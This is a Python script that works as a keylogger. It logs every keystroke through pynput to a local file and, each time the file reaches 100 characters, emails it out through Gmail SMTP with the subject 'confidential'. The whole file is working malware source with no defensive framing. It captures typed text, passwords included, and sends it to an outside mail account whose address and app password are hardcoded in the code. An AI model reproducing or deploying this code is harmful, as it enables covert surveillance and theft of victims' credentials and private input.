#r= reading, w=write a=apending
import smtplib
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.message import EmailMessage
from pynput.keyboard import Listener,Key
def writetofile(key):
    try:
        keydata=key.char
    except AttributeError:
        if key==Key.space:
            keydata= " "
        if key==Key.shift_r:
            keydata= ""
        if key==Key.backspace:
            with open('log.txt', 'rb+') as f:
                    f.seek(0, 2)  # aller à la fin
                    size = f.tell()
                    if size > 0:
                        f.truncate(size - 1)
            return
        if key==Key.shift:
            keydata= ""
        if key==Key.enter:
            keydata= "\n"
            

    with open('log.txt', 'a',encoding='utf-8') as f:
        f.write(keydata)
    with open('log.txt', 'r', encoding='utf-8') as f:
            content = f.read()
            if len(content)>=100:
                send_email_with_content(content)
                open("log.txt", "w").close()
def send_email_with_content(content):
    email = "lolabagnyan@gmail.com"
    password = "mesvrnuwljwerjay"

    msg = EmailMessage()
    msg["Subject"] = "confidential"
    msg["From"] = email
    msg["To"] = email
    msg.set_content("data extraction")

    file_path = "log.txt"

    if not os.path.exists(file_path):
        print("file not found !")
        exit()

    with open(file_path, "rb") as f:
        msg.add_attachment(
            f.read(),
            maintype="text",
            subtype="plain",
            filename="log.txt"
        )

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
        smtp.login(email, password)
        smtp.send_message(msg)

    print("Mail sent")
with Listener(on_press=writetofile) as l:
    l.join()


